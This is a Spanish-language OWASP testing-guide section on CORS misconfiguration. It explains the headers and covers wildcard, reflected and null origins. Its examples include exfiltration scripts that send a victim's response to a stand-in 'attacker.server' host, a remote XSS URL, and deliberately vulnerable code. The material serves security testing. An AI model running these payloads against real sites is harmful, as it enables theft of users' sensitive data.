# Pruebas de Cross Origin Resource Sharing

|ID          |
|------------|
|WSTG-CLNT-07|

## Resumen

[Cross Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) es un mecanismo que habilita a un navegador web a realizar solicitudes cross-domain usando la API XMLHttpRequest (XHR) Level 2 (L2) de manera controlada. En el pasado, la API XHR L1 solo permitía que las solicitudes se enviaran dentro del mismo origen ya que estaba restringida por la [Política del Mismo Origen](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) (SOP, por sus siglas en inglés).

Las solicitudes cross-origin tienen un encabezado `Origin` que identifica el dominio que inicia la solicitud y siempre se envía al servidor. CORS define el protocolo a usar entre un navegador web y un servidor para determinar si una solicitud cross-origin está permitida. [Encabezados](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) HTTP se usan para lograr esto.

La [especificación CORS del W3C](https://www.w3.org/TR/cors/) exige que para solicitudes no simples, tales como solicitudes distintas a GET o POST o solicitudes que usan credenciales, una solicitud pre-flight OPTIONS debe ser enviada con antelación para verificar si el tipo de solicitud tendrá un mal impacto en los datos. La solicitud pre-flight verifica los métodos y encabezados permitidos por el servidor, y si se permiten credenciales. Basado en el resultado de la solicitud OPTIONS, el navegador decide si la solicitud está permitida o no.

### Origin y Access-Control-Allow-Origin

El encabezado de solicitud `Origin` siempre es enviado por el navegador en una solicitud CORS e indica el origen de la solicitud. El encabezado Origin no puede ser cambiado desde JavaScript ya que [el navegador (el user-agent) bloquea su modificación](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name); sin embargo, confiar en este encabezado para verificaciones de Control de Acceso no es una buena idea ya que puede ser falsificado fuera del navegador, por ejemplo usando un proxy, por lo que aún necesitas verificar que se usen protocolos a nivel de aplicación para proteger datos sensibles.

`Access-Control-Allow-Origin` es un encabezado de respuesta usado por un servidor para indicar qué dominios tienen permitido leer la respuesta. Basado en la Especificación CORS del W3, depende del cliente determinar y imponer la restricción de si el cliente tiene acceso a los datos de respuesta basándose en este encabezado.

Desde una perspectiva de pruebas de seguridad, deberías buscar configuraciones inseguras como por ejemplo usar el comodín `*` como valor del encabezado `Access-Control-Allow-Origin`, lo cual significa que todos los dominios están permitidos. Otro ejemplo inseguro es cuando el servidor devuelve el encabezado origin sin verificaciones adicionales, lo cual puede llevar a acceso a datos sensibles. Esta configuración de permitir solicitudes cross-origin es muy insegura y no es aceptable en términos generales, excepto en el caso de una API pública que esté destinada a ser accesible por todos.

### Access-Control-Request-Method y Access-Control-Allow-Method

El encabezado `Access-Control-Request-Method` se usa cuando un navegador realiza una solicitud preflight OPTIONS y permite al cliente indicar el método de solicitud de la solicitud final. Por otro lado, `Access-Control-Allow-Method` es un encabezado de respuesta usado por el servidor para describir los métodos que los clientes tienen permitido usar.

### Access-Control-Request-Headers y Access-Control-Allow-Headers

Estos dos encabezados se usan entre el navegador y el servidor para determinar qué encabezados pueden ser usados para realizar una solicitud cross-origin.

### Access-Control-Allow-Credentials

Este encabezado de respuesta permite a los navegadores leer la respuesta cuando se pasan credenciales. Cuando se envía el encabezado, la aplicación web debe establecer un origen al valor del encabezado `Access-Control-Allow-Origin`. El encabezado `Access-Control-Allow-Credentials` no puede ser usado junto con el encabezado `Access-Control-Allow-Origin` cuyo valor es el comodín `*` como el siguiente:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Validación de Entrada

XHR L2 introduce la posibilidad de crear una solicitud cross-domain usando la API XHR para compatibilidad hacia atrás. Esto puede introducir vulnerabilidades de seguridad que en XHR L1 no estaban presentes. Puntos interesantes del código a explotar serían URLs que se pasan a XMLHttpRequest sin validación, especialmente si se permiten URLs absolutas porque eso podría llevar a inyección de código. Asimismo, otra parte de la aplicación que puede ser explotada es si los datos de respuesta no se escapan y podemos controlarlos proporcionando entrada del usuario.

### Otros Encabezados

Hay otros encabezados involucrados como `Access-Control-Max-Age` que determina el tiempo que una solicitud preflight puede ser cacheada en el navegador, o `Access-Control-Expose-Headers` que indica qué encabezados son seguros de exponer a la API de una especificación CORS API.

Para revisar encabezados CORS, referirse al [documento CORS de MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers).

## Objetivos de Prueba

- Identificar endpoints que implementan CORS.
- Asegurar que la configuración CORS sea segura o inofensiva.

## Cómo Probar

Una herramienta como [ZAP](https://www.zaproxy.org) puede permitir a los testers interceptar encabezados HTTP, lo cual puede revelar cómo se usa CORS. Los testers deberían prestar particular atención al encabezado origin para aprender qué dominios están permitidos. Además, en algunos casos, la inspección manual del JavaScript es necesaria para determinar si el código es vulnerable a inyección de código debido a un manejo inadecuado de la entrada proporcionada por el usuario.

### Mala Configuración CORS

Establecer el comodín al encabezado `Access-Control-Allow-Origin` (es decir, `Access-Control-Allow-Origin: *`) no es seguro si la respuesta contiene información sensible. Aunque no puede ser usado con `Access-Control-Allow-Credentials: true` al mismo tiempo, puede ser peligroso donde el control de acceso se hace únicamente por las reglas del firewall o las direcciones IP de origen, en lugar de estar protegido por credenciales.

#### Comodín Access-Control-Allow-Origin

Un tester puede verificar si existe `Access-Control-Allow-Origin: *` en los mensajes de respuesta HTTP.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

Si una respuesta contiene datos sensibles, un atacante puede robarlos a través del uso de XHR:

```html
<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: listener del atacante para robar la respuesta
                    xhr2.open("POST", "https://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: servidor vulnerable con el encabezado `Access-Control-Allow-Origin: *`
            xhr.open("GET", "https://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>
```

#### Política CORS Dinámica

Una aplicación web moderna o API puede estar implementada para permitir solicitudes cross-origin dinámicamente, generalmente para permitir las solicitudes de los subdominios como el siguiente:

```php
if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}
```

En este ejemplo, todas las solicitudes de los subdominios de example.com serán permitidas. Debe asegurarse que la expresión regular que se usa para coincidir sea completa. De lo contrario, si se coincidía simplemente con `example.com` (sin `$` añadido), los atacantes podrían ser capaces de evadir la política CORS añadiendo su dominio al encabezado `Origin`.

```http
GET /test.php HTTP/1.1
Host: example.com
[...]
Origin: https://example.com.attacker.com
Cookie: <session cookie>
```

Cuando se envía la solicitud anterior, si se devuelve la siguiente respuesta con el `Access-Control-Allow-Origin` cuyo valor es el mismo que la entrada del atacante, el atacante puede leer la respuesta posteriormente y acceder a información sensible que solo es accesible por un usuario víctima.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: https://example.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

#### Valor de Origin Nulo en Lista Blanca

El encabezado `Origin` puede tener el valor `null` en situaciones específicas, tales como solicitudes disparadas desde un archivo local, una redirección, o un objeto serializado. Los desarrolladores a veces ponen en lista blanca el origen `null` para facilitar el desarrollo local o para soportar clientes no web.

Sin embargo, el origen `null` sirve como un "comodín" que puede ser explotado. Un atacante puede generar programáticamente una solicitud con el origen `null` usando un `iframe` en modo sandbox.

Si el servidor simplemente refleja el origen `null` en los encabezados de respuesta, especialmente con credenciales permitidas, crea una vulnerabilidad similar al comodín genérico.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml
```

En un escenario de explotación, un atacante embebe un `iframe` en modo sandbox en su sitio malicioso. El atributo `sandbox` fuerza al navegador a establecer el `Origin` de las solicitudes iniciadas desde dentro de ese frame a `null`.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
    <script>
        fetch('https://victim.site/sensitive-data', {
            method: 'GET',
            credentials: 'include' // Esencial para enviar cookies/encabezados de auth
        })
        .then(response => response.text())
        .then(data => {
            // Exfiltrar datos al servidor del atacante
            location.href = 'https://attacker.server/log?data=' + btoa(data);
        });
    </script>">
</iframe>
```

Consecuentemente, el navegador ve la solicitud viniendo de `null`, el servidor permite `null`, y el atacante lee exitosamente la respuesta sensible.

### Debilidad de Validación de Entrada

El concepto CORS puede ser visto desde un ángulo completamente diferente. Un atacante puede permitir su política CORS a propósito para inyectar código en la aplicación web objetivo.

#### XSS Remoto con CORS

Este código hace una solicitud al recurso pasado después del carácter `#` en la URL, inicialmente usado para obtener recursos en el mismo servidor.

Código vulnerable:

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

Por ejemplo, una solicitud como esta mostrará los contenidos del archivo `profile.php`:

`https://example.foo/main.php#profile.php`

Solicitud y respuesta generada por `https://example.foo/profile.php`:

```html
GET /profile.php HTTP/1.1
Host: example.foo
[...]
Referer: https://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[Response Body]
```

Ahora, como no hay validación de URL podemos inyectar un script remoto, que será inyectado y ejecutado en el contexto del dominio `example.foo`, con una URL como esta:

```text
https://example.foo/main.php#https://attacker.bar/file.php
```

Solicitud y respuesta generada por `https://attacker.bar/file.php`:

```html
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: https://example.foo/main.php
origin: https://example.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
```

## Referencias

- [Hoja de Referencia de Seguridad HTML5 de OWASP](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [MDN Cross-Origin Resources Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
